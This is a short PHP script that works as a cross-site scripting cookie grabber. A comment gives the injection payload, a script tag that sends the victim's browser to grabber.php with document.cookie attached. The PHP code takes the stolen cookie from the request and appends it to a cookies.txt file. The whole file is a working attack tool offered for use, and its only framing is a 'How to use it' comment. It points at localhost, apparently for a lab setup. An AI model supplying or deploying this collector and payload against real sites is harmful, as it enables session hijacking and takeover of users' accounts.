<?php 
// How to use it
# <script>document.location='http://localhost/XSS/grabber.php?c=' + document.cookie</script>

// Write the cookie in a file
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);

?>